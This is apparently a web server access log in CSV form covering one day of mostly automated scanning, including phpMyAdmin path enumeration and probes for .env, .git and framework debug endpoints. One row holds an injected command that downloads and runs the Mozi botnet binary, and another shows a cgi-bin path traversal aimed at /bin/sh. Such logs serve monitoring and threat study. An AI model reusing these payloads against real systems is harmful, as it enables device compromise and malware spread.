remote_host,ident,user,time_raw,time_iso,time_epoch,method,uri,protocol,status,bytes_sent,referer,user_agent
212.117.30.221,,,13/Aug/2022:12:28:51 -0500,2022-08-13T12:28:51-05:00,1660411731,GET,/_phpMyAdmin/index.php?lang=en,HTTP/1.1,301,261.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221,,,13/Aug/2022:12:28:51 -0500,2022-08-13T12:28:51-05:00,1660411731,GET,/mysql/db/index.php?lang=en,HTTP/1.1,301,258.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221,,,13/Aug/2022:12:28:51 -0500,2022-08-13T12:28:51-05:00,1660411731,GET,/mysqlmanager/index.php?lang=en,HTTP/1.1,301,262.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221,,,13/Aug/2022:12:28:51 -0500,2022-08-13T12:28:51-05:00,1660411731,GET,/PMA/index.php?lang=en,HTTP/1.1,301,253.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221,,,13/Aug/2022:12:28:51 -0500,2022-08-13T12:28:51-05:00,1660411731,GET,/1phpmyadmin/index.php?lang=en,HTTP/1.1,301,261.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221,,,13/Aug/2022:12:28:52 -0500,2022-08-13T12:28:52-05:00,1660411732,GET,/sql/phpMyAdmin/index.php?lang=en,HTTP/1.1,301,264.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221,,,13/Aug/2022:12:28:52 -0500,2022-08-13T12:28:52-05:00,1660411732,GET,/mysql/admin/index.php?lang=en,HTTP/1.1,301,261.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221,,,13/Aug/2022:12:28:52 -0500,2022-08-13T12:28:52-05:00,1660411732,GET,/admin/sysadmin/index.php?lang=en,HTTP/1.1,301,264.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221,,,13/Aug/2022:12:28:52 -0500,2022-08-13T12:28:52-05:00,1660411732,GET,/administrator/db/index.php?lang=en,HTTP/1.1,301,266.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221,,,13/Aug/2022:12:28:52 -0500,2022-08-13T12:28:52-05:00,1660411732,GET,/sql/webdb/index.php?lang=en,HTTP/1.1,301,259.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221,,,13/Aug/2022:12:28:52 -0500,2022-08-13T12:28:52-05:00,1660411732,GET,/shopdb/index.php?lang=en,HTTP/1.1,301,256.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221,,,13/Aug/2022:12:28:52 -0500,2022-08-13T12:28:52-05:00,1660411732,GET,/db/phpMyAdmin-5/index.php?lang=en,HTTP/1.1,301,265.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221,,,13/Aug/2022:12:28:52 -0500,2022-08-13T12:28:52-05:00,1660411732,GET,/phpmyadmin2017/index.php?lang=en,HTTP/1.1,301,264.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221,,,13/Aug/2022:12:28:52 -0500,2022-08-13T12:28:52-05:00,1660411732,GET,/phpmyadmin1/index.php?lang=en,HTTP/1.1,301,261.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221,,,13/Aug/2022:12:28:53 -0500,2022-08-13T12:28:53-05:00,1660411733,GET,/phpMyAdmin-5.1.1/index.php?lang=en,HTTP/1.1,301,266.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221,,,13/Aug/2022:12:28:53 -0500,2022-08-13T12:28:53-05:00,1660411733,GET,/db/dbweb/index.php?lang=en,HTTP/1.1,301,258.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221,,,13/Aug/2022:12:28:53 -0500,2022-08-13T12:28:53-05:00,1660411733,GET,/phpmyadmin2021/index.php?lang=en,HTTP/1.1,301,264.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221,,,13/Aug/2022:12:28:53 -0500,2022-08-13T12:28:53-05:00,1660411733,GET,/sql/sqladmin/index.php?lang=en,HTTP/1.1,301,262.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221,,,13/Aug/2022:12:28:53 -0500,2022-08-13T12:28:53-05:00,1660411733,GET,/dbadmin/index.php?lang=en,HTTP/1.1,301,257.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221,,,13/Aug/2022:12:28:53 -0500,2022-08-13T12:28:53-05:00,1660411733,GET,/phpmyadmin2014/index.php?lang=en,HTTP/1.1,301,264.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221,,,13/Aug/2022:12:28:53 -0500,2022-08-13T12:28:53-05:00,1660411733,GET,/db/phpMyAdmin-4/index.php?lang=en,HTTP/1.1,301,265.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221,,,13/Aug/2022:12:28:53 -0500,2022-08-13T12:28:53-05:00,1660411733,GET,/database/index.php?lang=en,HTTP/1.1,301,258.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221,,,13/Aug/2022:12:28:54 -0500,2022-08-13T12:28:54-05:00,1660411734,GET,/db/phpmyadmin4/index.php?lang=en,HTTP/1.1,301,264.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221,,,13/Aug/2022:12:28:54 -0500,2022-08-13T12:28:54-05:00,1660411734,GET,/phpmyAdmin/index.php?lang=en,HTTP/1.1,301,260.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221,,,13/Aug/2022:12:28:54 -0500,2022-08-13T12:28:54-05:00,1660411734,GET,/administrator/web/index.php?lang=en,HTTP/1.1,301,267.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221,,,13/Aug/2022:12:28:54 -0500,2022-08-13T12:28:54-05:00,1660411734,GET,/db/dbadmin/index.php?lang=en,HTTP/1.1,301,260.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221,,,13/Aug/2022:12:28:54 -0500,2022-08-13T12:28:54-05:00,1660411734,GET,/administrator/phpMyAdmin/index.php?lang=en,HTTP/1.1,301,274.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221,,,13/Aug/2022:12:28:54 -0500,2022-08-13T12:28:54-05:00,1660411734,GET,/phpmyadmin4/index.php?lang=en,HTTP/1.1,301,261.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221,,,13/Aug/2022:12:28:54 -0500,2022-08-13T12:28:54-05:00,1660411734,GET,/MyAdmin/index.php?lang=en,HTTP/1.1,301,257.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221,,,13/Aug/2022:12:28:54 -0500,2022-08-13T12:28:54-05:00,1660411734,GET,/admin/db/index.php?lang=en,HTTP/1.1,301,258.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221,,,13/Aug/2022:12:28:55 -0500,2022-08-13T12:28:55-05:00,1660411735,GET,/phpMyAdmin-5.1.0/index.php?lang=en,HTTP/1.1,301,266.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221,,,13/Aug/2022:12:28:55 -0500,2022-08-13T12:28:55-05:00,1660411735,GET,/phpmyadmin2020/index.php?lang=en,HTTP/1.1,301,264.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221,,,13/Aug/2022:12:28:55 -0500,2022-08-13T12:28:55-05:00,1660411735,GET,/db/phpMyAdmin-3/index.php?lang=en,HTTP/1.1,301,265.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221,,,13/Aug/2022:12:28:55 -0500,2022-08-13T12:28:55-05:00,1660411735,GET,/phpMyAdmin5.1/index.php?lang=en,HTTP/1.1,301,263.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221,,,13/Aug/2022:12:28:55 -0500,2022-08-13T12:28:55-05:00,1660411735,GET,/mysql/pma/index.php?lang=en,HTTP/1.1,301,259.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221,,,13/Aug/2022:12:28:55 -0500,2022-08-13T12:28:55-05:00,1660411735,GET,/myadmin/index.php?lang=en,HTTP/1.1,301,257.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221,,,13/Aug/2022:12:28:55 -0500,2022-08-13T12:28:55-05:00,1660411735,GET,/wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php?lang=en,HTTP/1.1,301,299.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221,,,13/Aug/2022:12:28:56 -0500,2022-08-13T12:28:56-05:00,1660411736,GET,/admin/phpmyadmin/index.php?lang=en,HTTP/1.1,301,266.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221,,,13/Aug/2022:12:28:56 -0500,2022-08-13T12:28:56-05:00,1660411736,GET,/phpMyAdmin4/index.php?lang=en,HTTP/1.1,301,261.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221,,,13/Aug/2022:12:28:56 -0500,2022-08-13T12:28:56-05:00,1660411736,GET,/phpmyadmin3/index.php?lang=en,HTTP/1.1,301,261.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221,,,13/Aug/2022:12:28:56 -0500,2022-08-13T12:28:56-05:00,1660411736,GET,/sql/sql-admin/index.php?lang=en,HTTP/1.1,301,263.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221,,,13/Aug/2022:12:28:56 -0500,2022-08-13T12:28:56-05:00,1660411736,GET,/phpMyAdmin-5.1.3/index.php?lang=en,HTTP/1.1,301,266.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221,,,13/Aug/2022:12:28:56 -0500,2022-08-13T12:28:56-05:00,1660411736,GET,/db/webadmin/index.php?lang=en,HTTP/1.1,301,261.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221,,,13/Aug/2022:12:28:56 -0500,2022-08-13T12:28:56-05:00,1660411736,GET,/mysqladmin/index.php?lang=en,HTTP/1.1,301,260.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221,,,13/Aug/2022:12:28:56 -0500,2022-08-13T12:28:56-05:00,1660411736,GET,/phpmyadmin2012/index.php?lang=en,HTTP/1.1,301,264.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221,,,13/Aug/2022:12:28:56 -0500,2022-08-13T12:28:56-05:00,1660411736,GET,/phpMyAdmin2/index.php?lang=en,HTTP/1.1,301,261.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221,,,13/Aug/2022:12:28:57 -0500,2022-08-13T12:28:57-05:00,1660411737,GET,/db/phpmyadmin3/index.php?lang=en,HTTP/1.1,301,264.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221,,,13/Aug/2022:12:28:57 -0500,2022-08-13T12:28:57-05:00,1660411737,GET,/sql/myadmin/index.php?lang=en,HTTP/1.1,301,261.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221,,,13/Aug/2022:12:28:57 -0500,2022-08-13T12:28:57-05:00,1660411737,GET,/phpmyadmin_/index.php?lang=en,HTTP/1.1,301,261.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221,,,13/Aug/2022:12:28:57 -0500,2022-08-13T12:28:57-05:00,1660411737,GET,/db/phpmyadmin/index.php?lang=en,HTTP/1.1,301,263.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
185.7.214.117,,,13/Aug/2022:12:46:41 -0500,2022-08-13T12:46:41-05:00,1660412801,GET,/_ignition/execute-solution,HTTP/1.1,301,258.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
107.182.129.239,,,13/Aug/2022:12:54:34 -0500,2022-08-13T12:54:34-05:00,1660413274,POST,/boaform/admin/formLogin,HTTP/1.1,301,255.0,http://194.195.210.97:80/admin/login.asp,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0
185.21.216.169,,,13/Aug/2022:13:01:50 -0500,2022-08-13T13:01:50-05:00,1660413710,GET,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
65.109.12.206,,,13/Aug/2022:13:34:52 -0500,2022-08-13T13:34:52-05:00,1660415692,POST,/boaform/admin/formLogin,HTTP/1.1,301,255.0,http://194.195.210.97:80/admin/login.asp,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0
111.92.76.18,,,13/Aug/2022:13:53:42 -0500,2022-08-13T13:53:42-05:00,1660416822,27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$,HTTP/1.0,,400,226.0,,
144.202.36.16,,,13/Aug/2022:14:04:44 -0500,2022-08-13T14:04:44-05:00,1660417484,GET,/,HTTP/1.1,301,241.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"
185.7.214.117,,,13/Aug/2022:14:13:35 -0500,2022-08-13T14:13:35-05:00,1660418015,GET,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.7.214.117,,,13/Aug/2022:14:28:08 -0500,2022-08-13T14:28:08-05:00,1660418888,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh,HTTP/1.1,400,226.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
167.94.138.46,,,13/Aug/2022:14:55:25 -0500,2022-08-13T14:55:25-05:00,1660420525,GET,/,HTTP/1.1,301,232.0,,
167.94.138.46,,,13/Aug/2022:14:55:25 -0500,2022-08-13T14:55:25-05:00,1660420525,GET,/,HTTP/1.1,301,232.0,,Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)
167.94.138.46,,,13/Aug/2022:14:55:25 -0500,2022-08-13T14:55:25-05:00,1660420525,PRI,*,HTTP/2.0,400,226.0,,
185.196.220.70,,,13/Aug/2022:15:18:44 -0500,2022-08-13T15:18:44-05:00,1660421924,GET,/,HTTP/1.1,301,232.0,,Linux Gnu (cow)
185.254.196.223,,,13/Aug/2022:15:26:08 -0500,2022-08-13T15:26:08-05:00,1660422368,GET,/.env,HTTP/1.1,301,236.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223,,,13/Aug/2022:15:26:09 -0500,2022-08-13T15:26:09-05:00,1660422369,POST,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.7.214.117,,,13/Aug/2022:15:34:29 -0500,2022-08-13T15:34:29-05:00,1660422869,GET,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
206.189.238.130,,,13/Aug/2022:15:44:06 -0500,2022-08-13T15:44:06-05:00,1660423446,GET,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
206.189.238.130,,,13/Aug/2022:15:44:06 -0500,2022-08-13T15:44:06-05:00,1660423446,GET,/,HTTP/1.1,301,233.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
206.189.238.130,,,13/Aug/2022:15:44:06 -0500,2022-08-13T15:44:06-05:00,1660423446,GET,/.git/HEAD,HTTP/1.1,301,242.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
206.189.238.130,,,13/Aug/2022:15:44:06 -0500,2022-08-13T15:44:06-05:00,1660423446,GET,/mftp/,HTTP/1.1,301,238.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
206.189.238.130,,,13/Aug/2022:15:44:06 -0500,2022-08-13T15:44:06-05:00,1660423446,GET,/.env,HTTP/1.1,301,237.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
85.204.209.241,,,13/Aug/2022:15:52:08 -0500,2022-08-13T15:52:08-05:00,1660423928,GET,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
221.2.163.231,,,13/Aug/2022:16:06:55 -0500,2022-08-13T16:06:55-05:00,1660424815,\x16\x03\x01,,,400,226.0,,
185.7.214.117,,,13/Aug/2022:16:19:21 -0500,2022-08-13T16:19:21-05:00,1660425561,GET,/actuator/gateway/routes,HTTP/1.1,301,255.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.104.242.173,,,13/Aug/2022:16:22:44 -0500,2022-08-13T16:22:44-05:00,1660425764,\xba\xabd\xa1EZC\xdbM\x87\xee^\xfd\xbf\x159,X\xd4>\x12\x98\xc4<\xe0\x13\xcf,,400,226.0,,
109.206.241.219,,,13/Aug/2022:16:26:55 -0500,2022-08-13T16:26:55-05:00,1660426015,POST,/boaform/admin/formLogin,HTTP/1.1,301,255.0,http://194.195.210.97:80/admin/login.asp,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0
162.221.192.26,,,13/Aug/2022:16:32:36 -0500,2022-08-13T16:32:36-05:00,1660426356,GET,/admin/,HTTP/1.1,301,238.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
62.233.50.179,,,13/Aug/2022:16:34:48 -0500,2022-08-13T16:34:48-05:00,1660426488,\x03,,,400,226.0,,
45.83.65.225,,,13/Aug/2022:17:07:12 -0500,2022-08-13T17:07:12-05:00,1660428432,GET,/,HTTP/1.1,301,232.0,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0
167.248.133.120,,,13/Aug/2022:18:03:27 -0500,2022-08-13T18:03:27-05:00,1660431807,GET,/,HTTP/1.1,301,232.0,,
167.248.133.120,,,13/Aug/2022:18:03:27 -0500,2022-08-13T18:03:27-05:00,1660431807,GET,/,HTTP/1.1,301,232.0,,Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)
167.248.133.120,,,13/Aug/2022:18:03:27 -0500,2022-08-13T18:03:27-05:00,1660431807,PRI,*,HTTP/2.0,400,226.0,,
192.241.212.131,,,13/Aug/2022:18:18:42 -0500,2022-08-13T18:18:42-05:00,1660432722,MGLNDD_194.195.210.97_80\n,,,400,226.0,,
185.254.196.223,,,13/Aug/2022:18:25:21 -0500,2022-08-13T18:25:21-05:00,1660433121,GET,/.env,HTTP/1.1,301,236.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223,,,13/Aug/2022:18:25:22 -0500,2022-08-13T18:25:22-05:00,1660433122,POST,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
66.249.65.129,,,13/Aug/2022:18:38:08 -0500,2022-08-13T18:38:08-05:00,1660433888,GET,/robots.txt,HTTP/1.1,301,242.0,,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
66.249.65.129,,,13/Aug/2022:18:38:08 -0500,2022-08-13T18:38:08-05:00,1660433888,GET,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
94.73.10.127,,,13/Aug/2022:18:49:15 -0500,2022-08-13T18:49:15-05:00,1660434555,GET,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
94.73.10.127,,,13/Aug/2022:18:49:15 -0500,2022-08-13T18:49:15-05:00,1660434555,GET,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
109.248.6.35,,,13/Aug/2022:19:05:14 -0500,2022-08-13T19:05:14-05:00,1660435514,GET,/,HTTP/1.0,301,233.0,,masscan-ng/1.3 (https://github.com/bi-zone/masscan-ng)
95.161.131.237,,,13/Aug/2022:19:06:55 -0500,2022-08-13T19:06:55-05:00,1660435615,GET,/,HTTP/1.1,301,232.0,,Linux Gnu (cow)
185.153.216.169,,,13/Aug/2022:19:56:58 -0500,2022-08-13T19:56:58-05:00,1660438618,GET,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
107.182.129.239,,,13/Aug/2022:20:12:09 -0500,2022-08-13T20:12:09-05:00,1660439529,POST,/boaform/admin/formLogin,HTTP/1.1,301,255.0,http://194.195.210.97:80/admin/login.asp,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0
23.90.160.122,,,13/Aug/2022:20:13:01 -0500,2022-08-13T20:13:01-05:00,1660439581,GET,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
